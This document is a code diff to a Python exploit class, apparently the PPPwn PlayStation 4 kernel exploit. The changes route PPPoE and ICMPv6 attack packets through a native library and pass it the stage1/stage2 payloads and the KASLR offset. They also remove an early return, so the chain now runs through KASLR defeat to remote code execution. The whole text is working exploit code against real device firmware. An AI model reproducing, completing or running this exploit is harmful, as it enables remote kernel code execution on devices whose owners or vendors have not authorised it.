@@ -179,6 +179,8 @@ class Exploit():
         self.stage2 = stage2
         self.libpppwn = libpppwn
         self.libpppwn.setInterface(c_char_p(iface.encode()))
+        self.libpppwn.setStage1(c_char_p(self.stage1), len(self.stage1))
+        self.libpppwn.setStage2(c_char_p(self.stage2), len(self.stage2))
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
 
     def kdlsym(self, addr):
@@ -276,7 +278,7 @@ class Exploit():
         print('[+] AC cookie length: {}'.format(hex(len(ac_cookie))))
 
         print('[*] Sending PADO...')
-        self.libpppwn.sendPado()
+        self.libpppwn.sendPado(c_char_p(bytes(ac_cookie)), c_uint64(len(ac_cookie)))
 
         print('[*] Waiting for PADR...')
         while True:
@@ -700,8 +702,6 @@ class Exploit():
         print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
 
-        return
-
         print('')
         print('[+] STAGE 2: KASLR defeat')
 
@@ -716,6 +716,7 @@ class Exploit():
         print('[+] pppoe_softc_list: {}'.format(hex(self.pppoe_softc_list)))
 
         self.kaslr_offset = self.pppoe_softc_list - self.offs.PPPOE_SOFTC_LIST
+        self.libpppwn.setKaslrOffset(c_uint64(self.kaslr_offset))
         print('[+] kaslr_offset: {}'.format(hex(self.kaslr_offset)))
 
         if (self.pppoe_softc_list & 0xffffffff00000fff
@@ -727,18 +728,12 @@ class Exploit():
         print('[+] STAGE 3: Remote code execution')
 
         print('[*] Sending LCP terminate request...')
-        self.s.send(
-            Ether(
-                src=self.source_mac, dst=self.target_mac, type=ETHERTYPE_PPPOE)
-            / PPPoE(sessionid=self.SESSION_ID) / PPP() / PPP_LCP_Terminate())
+        self.libpppwn.sendLcpTerminate()
 
         self.ppp_negotation(self.build_fake_lle)
 
         print('[*] Triggering code execution...')
-        self.s.send(
-            Ether(src=self.source_mac, dst=self.target_mac) /
-            IPv6(src=self.SOURCE_IPV6, dst=self.target_ipv6) /
-            ICMPv6EchoRequest())
+        self.libpppwn.sendIcmpv6Echo(c_char_p(self.SOURCE_IPV6.encode()))
 
         print('[*] Waiting for stage1 to resume...')
         count = 0
@@ -749,11 +744,7 @@ class Exploit():
                 count += 1
 
         print('[*] Sending PADT...')
-        self.s.send(
-            Ether(src=self.source_mac,
-                  dst=self.target_mac,
-                  type=ETHERTYPE_PPPOEDISC) /
-            PPPoED(code=PPPOE_CODE_PADT, sessionid=self.SESSION_ID))
+        self.libpppwn.sendPadt()
 
         self.ppp_negotation()
         self.lcp_negotiation()
